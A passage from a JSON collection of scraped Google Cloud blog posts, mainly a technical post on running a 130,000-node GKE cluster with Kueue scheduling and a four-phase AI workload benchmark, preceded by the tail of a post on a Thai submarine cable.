a key Google partner in landing a new submarine cable in Thailand. IGC brings to the project its extensive experience operating a nationwide network and international cable gateway. This cable is an important new piece of digital infrastructure that will accelerate Thailand's ambitious digital economy development strategy.\"</span><span style=\"vertical-align: baseline;\"> - </span><strong style=\"vertical-align: baseline;\">Preeyaporn Tangpaosak, President, ALT Telecom</strong></p>\n<p><span style=\"vertical-align: baseline;\">When they’re complete, TalayLink and the connectivity hubs will support network resilience across Australia, </span><a href=\"https://cloud.google.com/blog/products/infrastructure/investing-in-connectivity-and-growth-for-africa\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Africa</span></a><span style=\"vertical-align: baseline;\"> and Southeast Asia. When combined with our previously announced connectivity hubs in the </span><a href=\"https://cloud.google.com/blog/products/networking/introducing-dhivaru-new-subsea-cable?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Maldives and Christmas Island</span></a><span style=\"vertical-align: baseline;\">, these investments will provide onward connectivity across the Indian Ocean and beyond to the Middle East</span><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">This new cable and our regional connectivity hubs will directly support Western Australia’s roadmap to secure a safe, inclusive digital future, as well as the Royal Thai Government’s objective of economic transformation through AI and digital inclusion. We are excited to contribute to the economic and social growth across Australia, Thailand and Southeast Asia through resilient, reliable internet infrastructure. </span></p></div>",
        "published_date": "2025-11-23 18:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/containers-kubernetes/how-we-built-a-130000-node-gke-cluster/",
        "title": "How Google Does It: Building the largest known Kubernetes cluster, with 130,000 nodes",
        "thumbnail": null,
        "author": "Maciek Różacki",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At Google Cloud, we’re constantly pushing the scalability of </span><strong style=\"vertical-align: baseline;\">Google Kubernetes Engine (GKE)</strong><span style=\"vertical-align: baseline;\"> so that it can keep up with increasingly demanding workloads — especially AI. GKE already </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/gke-65k-nodes-and-counting\"><span style=\"text-decoration: underline; vertical-align: baseline;\">supports massive </span><strong style=\"text-decoration: underline; vertical-align: baseline;\">65,000-node clusters</strong></a><span style=\"vertical-align: baseline;\">, and at KubeCon, we shared that we successfully ran a </span><strong style=\"vertical-align: baseline;\">130,000-node cluster in experimental mode</strong><span style=\"vertical-align: baseline;\"> — twice the number of nodes compared to the officially supported and tested limit. </span></p>\n<p><span style=\"vertical-align: baseline;\">This kind of scaling isn't just about increasing the sheer number of nodes; it also requires scaling other critical dimensions, such as </span><strong style=\"vertical-align: baseline;\">Pod creation </strong><span style=\"vertical-align: baseline;\">and</span><strong style=\"vertical-align: baseline;\"> scheduling throughput</strong><span style=\"vertical-align: baseline;\">. For instance, during this test, we sustained Pod throughput of </span><strong style=\"vertical-align: baseline;\">1,000 Pods per second</strong><span style=\"vertical-align: baseline;\">, as well as storing over </span><strong style=\"vertical-align: baseline;\">1 million objects</strong><span style=\"vertical-align: baseline;\"> in our optimized distributed storage. In this blog, we take a look at the trends driving demand for these kinds of mega-clusters, and do a deep dive on the architectural innovations we implemented to make this extreme scalability a reality. </span></p>\n<h3><span style=\"vertical-align: baseline;\">The rise of the mega cluster</span></h3>\n<p><span style=\"vertical-align: baseline;\">Our largest customers are actively pushing the boundaries of GKE’s scalability and performance with their AI workloads. In fact, we already have numerous customers operating clusters in the 20-65K node range, and we anticipate the demand for large clusters to stabilize around the 100K node mark. </span></p>\n<p><span style=\"vertical-align: baseline;\">This sets up an interesting dynamic. In short, we are transitioning from a world constrained by chip supply to a world constrained by electrical power. Consider the fact that a single NVIDIA GB200 GPU needs 2700W of power. With tens of thousands, or even more, of these chips, a single cluster's power footprint could easily scale to hundreds of megawatts — ideally distributed across multiple data centers. Thus, for AI platforms exceeding 100K nodes, we’ll need robust multi-cluster solutions that can orchestrate distributed training or reinforcement learning across clusters and data centers. This is a significant challenge, and we’re actively investing in tools like</span><a href=\"https://kueue.sigs.k8s.io/docs/concepts/multikueue/\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">MultiKueue</span></a><span style=\"vertical-align: baseline;\"> to address it, with further innovations on the horizon. We are also advancing high-performance RDMA networking with the recently announced </span><a href=\"https://cloud.google.com/blog/products/networking/introducing-managed-dranet-in-google-kubernetes-engine\"><span style=\"text-decoration: underline; vertical-align: baseline;\">managed DRANET</span></a><span style=\"vertical-align: baseline;\">, improving topology awareness to maximize performance for massive AI workloads. Stay tuned.</span></p>\n<p><span style=\"vertical-align: baseline;\">At the same time, these investments also benefit users who operate at more modest scales — the vast majority of GKE customers. By hardening GKE's core systems for extreme usage, we create substantial headroom for average clusters, making them more resilient to errors, increasing tolerance for user misuse of the Kubernetes API, and generally optimizing all controllers for faster performance. And of course, all GKE customers, large and small, benefit from investments in an intuitive, self-service experience.</span></p>\n<h2><strong style=\"vertical-align: baseline;\">Key architectural innovations</strong></h2>\n<p><span style=\"vertical-align: baseline;\">With that said, achieving this level of scale requires significant innovations throughout the Kubernetes ecosystem, including control plane, custom scheduling and storage. Let’s take a look at a few key areas that were critical to this project.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Optimized read scalability</strong></h3>\n<p><span style=\"vertical-align: baseline;\">When operating at scale, there’s a need for a strongly consistent and snapshottable API server watch cache. At 130,000 nodes, the sheer volume of read requests to the API server can overwhelm the central object datastore. To solve this, Kubernetes includes several complementary features to offload these read requests from the central object datastore.</span></p>\n<p><span style=\"vertical-align: baseline;\">First, the Consistent Reads from Cache feature (KEP-2340), detailed in </span><a href=\"https://kubernetes.io/blog/2024/08/15/consistent-read-from-cache-beta/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">, enables the API server to serve strongly consistent data directly from its in-memory cache. This drastically reduces the load on the object storage database for common read patterns such as filtered list requests (e.g., \"all Pods on a specific node\"), by ensuring the cache's data is verifiably up-to-date before it serves the request.</span></p>\n<p><span style=\"vertical-align: baseline;\">Building on this foundation, the Snapshottable API Server Cache feature (KEP-4988) further enhances performance by allowing the API server to serve LIST requests for previous states (via pagination or by specifying </span><code style=\"vertical-align: baseline;\">resourceVersion</code><span style=\"vertical-align: baseline;\">) directly from that same consistent watch cache. By generating a B-tree \"snapshot\" of the cache at a specific resource version, the API server can efficiently handle subsequent LIST requests without repeatedly querying the datastore.</span></p>\n<p><span style=\"vertical-align: baseline;\">Together, these two enhancements address the problem of read amplification, ensuring the API server remains fast and responsive by serving both strongly consistent filtered reads and list requests of previous states directly from memory. This is essential for maintaining cluster-wide component health at extreme scale.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">An optimized distributed storage backend</strong></h3>\n<p><span style=\"vertical-align: baseline;\">To support the cluster’s massive scale, we relied on a proprietary key-value store based on Google’s Spanner distributed database. At 130K nodes, we required 13,000 QPS to update lease objects, ensuring that critical cluster operations such as node health checks didn’t become a bottleneck, and providing the stability needed for the entire system to operate reliably. We didn’t witness any bottlenecks with respect to the new storage system and it showed no signs of it not being able to support higher scales.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Kueue for advanced job queueing</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The default Kubernetes scheduler is designed to schedule individual Pods, but complex AI/ML environments require more sophisticated, job-level management. </span><a href=\"https://kueue.sigs.k8s.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Kueue</span></a><span style=\"vertical-align: baseline;\"> is a job queueing controller that brings batch system capabilities to Kubernetes. It decides *when* a job should be admitted based on fair-sharing policies, priorities, and resource quotas, and enables \"all-or-nothing\" scheduling for entire jobs. Built on top of the default scheduler, Kueue provided the orchestration necessary to manage the complex mix of competing training, batch, and inference workloads in our benchmark.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Future of scheduling: Enhanced workload awareness</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Beyond Kueue's job-level queueing, the Kubernetes ecosystem is evolving towards workload-aware scheduling in its core. The goal is to move from a Pod-centric to a workload-centric approach to scheduling. This means the scheduler will make placement decisions considering the entire workload's needs as a single unit, encompassing both available and potential capacity. This holistic view is crucial for optimizing price-performance, especially for the new wave of AI/ML training and inference workloads.</span></p>\n<p><span style=\"vertical-align: baseline;\">A key aspect of the emerging kubernetes scheduler is the native implementation of gang scheduling semantics within Kubernetes, a feature currently provided by add-ons like Kueue. The community is actively working on this through </span><a href=\"https://github.com/kubernetes/enhancements/tree/master/keps/sig-scheduling/4671-gang-scheduling\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">KEP-4671: Gang Scheduling</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">In time, support for workload-aware scheduling in core Kubernetes will simplify orchestrating large-scale, tightly coupled applications on GKE, making the platform even more powerful for demanding AI/ML and HPC use cases. We’re also working on integrating Kueue as a second-level scheduler within GKE.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">GCS FUSE for data access</strong></h3>\n<p><span style=\"vertical-align: baseline;\">AI workloads need to be able to access data efficiently. Together, </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/persistent-volumes/cloud-storage-fuse-csi-driver\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Storage FUSE</span></a><span style=\"vertical-align: baseline;\"> with parallel downloads and </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/cloud-storage-fuse-csi-driver-perf#enable-and-use-file-caching\"><span style=\"text-decoration: underline; vertical-align: baseline;\">caching</span></a><span style=\"vertical-align: baseline;\"> enabled and paired with the zonal </span><a href=\"https://cloud.google.com/storage/docs/anywhere-cache\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Anywhere Cache</span></a><span style=\"vertical-align: baseline;\">, allowing access to model data in Cloud Storage buckets as if it were a local file system, reducing latency up to 70%. This provides a scalable, high-throughput mechanism for feeding data to distributed jobs or scale-out inference workflows. Alternatively, there’s </span><a href=\"https://cloud.google.com/managed-lustre/docs/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Managed Lustre</span></a><span style=\"vertical-align: baseline;\">, a fully managed persistent zonal storage solution that supports workloads that need multi-petabyte capacity, TB/s throughput, and sub-millisecond latency. You can learn more about your storage options for AI/ML workloads </span><a href=\"https://cloud.google.com/architecture/ai-ml/storage-for-ai-ml\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Benchmarking GKE for large-scale, dynamic AI workloads</span></h2>\n<p><span style=\"vertical-align: baseline;\">To validate GKE's performance with large-scale AI/ML workloads, we designed a four-phase benchmark simulating a dynamic environment with complex resource management, prioritization, and scheduling challenges. This builds on the benchmark used in </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/benchmarking-a-65000-node-gke-cluster-with-ai-workloads\"><span style=\"text-decoration: underline; vertical-align: baseline;\">the previous 65K node scale test</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">We upgraded the benchmark to represent a typical AI platform that hosts mixed workloads, using workloads with distinct priority classes:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Low Priority:</strong><span style=\"vertical-align: baseline;\"> Preemptible batch processing, such as data preparation jobs.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Medium Priority:</strong><span style=\"vertical-align: baseline;\"> Core model training jobs that are important but can tolerate some queuing.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">High Priority:</strong><span style=\"vertical-align: baseline;\"> Latency-sensitive, user-facing inference services that must have resources guaranteed.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">We orchestrated the process using Kueue to manage quotas and resource sharing, and JobSet to manage training jobs.</span></p>\n<h4><strong style=\"vertical-align: baseline;\">Phase 1: Establishing a performance baseline with a large training job</strong></h4>\n<p><span style=\"vertical-align: baseline;\">To begin, we measure the cluster's foundational performance by scheduling a single, large-scale training workload. We deploy one </span><code style=\"vertical-align: baseline;\">JobSet</code><span style=\"vertical-align: baseline;\"> configured to run </span><strong style=\"vertical-align: baseline;\">130,000 medium-priority Pods</strong><span style=\"vertical-align: baseline;\"> simultaneously. This initial test allows us to establish a baseline for key metrics like Pod startup latency and overall scheduling throughput, revealing the overhead of launching a substantial workload on a clean cluster. This set the stage for evaluating GKE's performance under more complex conditions. After execution, we removed this JobSet from the cluster, leaving an empty cluster for Phase 2.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1_Phase 1_ Establishing a performance baseline by deploying a massive pre-training workload of 130,000 pods on a clean cluster\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_Phase_1__Establishing_a_performance_base.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Phase 1: Establishing a performance baseline by deploying a massive pre-training workload of 130,000 Pods on a clean cluster.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><strong style=\"vertical-align: baseline;\">Phase 2: Simulating a realistic mixed-workload environment</strong></h4>\n<p><span style=\"vertical-align: baseline;\">Next, we introduced resource contention to simulate a typical MLOps environment. At first, we deployed </span><strong style=\"vertical-align: baseline;\">650 low-priority batch </strong><strong style=\"vertical-align: baseline;\">Jobs</strong><span style=\"vertical-align: baseline;\"> (totaling 65,000 Pods), filling up half of the capacity of the cluster’s 130K nodes.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2_Phase 2_ Simulating a realistic MLOps environment by introducing 65,000 low-priority batch job pods to fill 50_ of cluster capacity\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_Phase_2__Simulating_a_realistic_MLOps_en.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: Phase 2: Simulating a realistic MLOps environment by introducing 65,000 low-priority batch job Pods to fill 50% of cluster capacity.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Then we introduced </span><strong style=\"vertical-align: baseline;\">8 large, medium-priority fine-tuning </strong><strong style=\"vertical-align: baseline;\">Jobs</strong><span style=\"vertical-align: baseline;\"> (totaling 104,000 Pods), taking 80% of the cluster capacity, and preempting 60% of the batch workloads (which represents 30% of total cluster capacity). This phase tested GKE’s ability to manage mixed workloads, as well preemption within a mixed workloads environment. In this scenario, we observed Kueue in action, preempting existing workload and gang-scheduling a large number of batch jobs all at once to allow for fine-tuning jobs to be scheduled. This highlighted Kueue's advantage over kube-scheduler: preemption happens much faster, and switching between workloads is almost instantaneous.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3_Kueue in Action_ Preempting low-priority batch workloads to accommodate 104,000 pods for higher-priority fine-tuning jobs\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_Kueue_in_Action__Preempting_low-priority.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: Kueue in action: Preempting low-priority batch workloads to accommodate 104,000 Pods for higher-priority fine-tuning jobs.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Phase 3: Prioritizing and scaling a latency-sensitive inference service</strong></p>\n<p><span style=\"vertical-align: baseline;\">In this phase, we simulated the arrival of a critical inference service by deploying a high-priority </span><code style=\"vertical-align: baseline;\">Job</code><span style=\"vertical-align: baseline;\">, totalling 26K Pods, or 20% of the capacity. To accommodate it, Kueue </span><strong style=\"vertical-align: baseline;\">preempted the remaining low-priority batch jobs</strong><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"4_Phase 3_ Prioritizing a critical, latency-sensitive inference service (26,000 pods) by preempting lower-priority batch jobs\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_Phase_3__Prioritizing_a_critical_latency.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: Phase 3: Prioritizing a critical, latency-sensitive inference service (26,000 Pods) by preempting the remaining of lower-priority batch jobs.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">We then scaled the inference workload to simulate a spike in traffic, first, preempting part of the medium-priority fine-tuning jobs. The inference workload scaled up to a total of </span><strong style=\"vertical-align: baseline;\">52,000 Pods,</strong><span style=\"vertical-align: baseline;\"> representing 40% of the capacity. Once fully scaled, we ran a 10-minute traffic simulation to measure performance under load.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"5_Simulating a traffic spike_ Scaling the inference workload to 52,000 pods (40_ capacity) triggers further preemption of fine-tuning jobs\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/5_Simulating_a_traffic_spike__Scaling_the_.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 5: Simulating a traffic spike. Scaling the inference workload to 52,000 Pods (40% capacity) triggers partial preemption of fine-tuning jobs.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><strong style=\"vertical-align: baseline;\">Phase 4: Validating cluster elasticity and resource recovery</strong></h4>\n<p><span style=\"vertical-align: baseline;\">Finally, we evaluated the cluster's ability to efficiently recover and reallocate resources once peak demand was over. We </span><strong style=\"vertical-align: baseline;\">scaled down the high-priority inference workload by 50%</strong><span style=\"vertical-align: baseline;\">, returning to its original initial phase. This demonstrated GKE’s elasticity, ensuring that valuable compute resources were not left idle as workload demands change, thereby maximizing utilization and cost-efficiency. Again, Kueue took care of admitting back the preempted fine-tuning workloads that were waiting in the cluster queue.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"6_Phase 4_ Demonstrating cluster elasticity by scaling down the inference workload and automatically recovering resources for pending batch jobs\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/6_Phase_4__Demonstrating_cluster_elasticit.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 6: Phase 4: Demonstrating cluster elasticity by scaling down the inference workload and automatically recovering resources for pending fine-tuning jobs.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">With the benchmark concluded, the resulting data paints a clear picture of how GKE handles extreme-scale pressure. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Demonstrating GKE’s scalability across dimensions</span></h3>\n<p><span style=\"vertical-align: baseline;\">The four benchmark phases tested multiple performance dimensions. In Phase 1, the cluster scaled to 130,000 Pods in 3 minutes and 40 seconds. In Phase 2, the low-priority batch workloads were created in 81 seconds, an average throughput of around 750 Pods/second. </span></p>\n<p><span style=\"vertical-align: baseline;\">Below is a diagram showing the execution timeline of the workload, highlighting the various phases of the benchmark. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"7_Execution timeline highlighting the four distinct phases of the large-scale AI workload benchmark\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/7_Execution_timeline_highlighting_the_four.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: Execution timeline highlighting the four distinct phases of the large-scale AI workload benchmark.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Overall, the benchmark demonstrated GKE's ability to manage fluctuating demands by preempting lower-priority jobs to make room for critical training and inference services, showcasing the cluster's elasticity and resource reallocation capabilities.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"8_Total number of running workload pods over time, demonstrating GKE_s ability to maintain high utilization through dynamic preemption and resource reallocation\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/8_Total_number_of_running_workload_pods_ov.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 8: Total number of running workload Pods over time, demonstrating GKE's ability to maintain high utilization through dynamic preemption and resource reallocation.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Intelligent workload management with Kueue</span></h3>\n<p><span style=\"vertical-align: baseline;\">For this benchmark, Kueue was a critical component for enabling workload prioritization. In Phase 2, Kueue preempted 60% of the batch workloads (30% of the cluster capacity) to make room for medium-priority jobs, with the remainder preempted in Phase 3 for the high-priority inference workload. This simulation of urgent tasks taking precedence is a common operational scenario, and this large-scale preemption highlights how the combination of GKE and Kueue can dynamically allocate resources to the most critical jobs. At its peak in Phase 2, 39,000 Pods were preempted in 93 seconds. The Pod churn during the preemption of batch workloads and admission and creation of fine-tuning workloads reached a median of 990 and an average of 745 Pods/s, as seen below.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"9_API request throughput during preemption events, showing a mix of POST and DELETE requests averaging 745 operations per second\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/9_API_request_throughput_during_preemption.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 9: API request throughput during preemption events, showing a mix of POST and DELETE requests averaging Pod churn of 745 Pods per second.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Checking the status of the admitted vs. evicted workloads from Kueue shows that many batch workloads were initially admitted, only to be preempted later by fine-tuning and later inference workloads.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"10_Workload status over time, visualizing the volume of jobs admitted versus those preempted (evicted) by Kueue as priorities shifted\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/10_Workload_status_over_time_visualizing_t.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 10: Workload status over time, visualizing the volume of jobs admitted versus those preempted (evicted) by Kueue as priorities shifted.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Blazing-fast scheduling at 1,000 pods/second</span></h3>\n<p><span style=\"vertical-align: baseline;\">The key measure of Kubernetes’ control-plane performance is its ability to create and schedule Pods quickly. Throughout the benchmark, especially during the most intense phases, GKE consistently achieved and sustained a throughput of up to 1,000 operations per second for both Pod creation and Pod binding (the act of scheduling a Pod to a node).</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"11_Control plane throughput_ Sustaining up to 1,000 operations per second for both Pod creations and Pod bindings during intense scheduling phases\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/11_Control_plane_throughput__Sustaining_up.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 11: Control plane throughput: Sustaining up to 1,000 operations per second for both Pod creation and Pod binding during intense scheduling phases.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"12_Detailed Pod creation throughput statistics (Average, Max, P50, P90, P99) across large pre-training, batch, and fine-tuning workloads\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/12_Detailed_Pod_creation_throughput_statis.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 12: Detailed pod-creation throughput statistics (Average, Max, P50, P90, P99) across large pre-training, batch, and fine-tuning workloads.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Low pod startup latency</span></h3>\n<p><span style=\"vertical-align: baseline;\">At the same time, pod-creation throughput was matched by low Pod-startup latencies across all workload types. For latency-sensitive inference workloads, the 99th percentile (P99) startup time was approximately 10 seconds, ensuring services could scale quickly to meet demand.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"13_Pod startup latency across workload types, highlighting a P99 latency of approximately 10 seconds for latency-sensitive inference workloads\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/13_Pod_startup_latency_across_workload_typ.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 13: Pod startup latency across workload types.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Control plane stability under extreme load</span></h3>\n<p><span style=\"vertical-align: baseline;\">GKE’s cluster control plane remained stable throughout the test. The total number of objects in a </span><strong style=\"vertical-align: baseline;\">single database replica</strong><span style=\"vertical-align: baseline;\"> exceeded </span><strong style=\"vertical-align: baseline;\">1 million</strong><span style=\"vertical-align: baseline;\"> at its peak, while API server latencies for critical operations remained well below their defined thresholds. This confirms that the cluster can remain responsive and manageable even at this scale.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"14_API Server latency for GET and LIST operations, remaining stable and well below defined thresholds despite the massive cluster scale\" 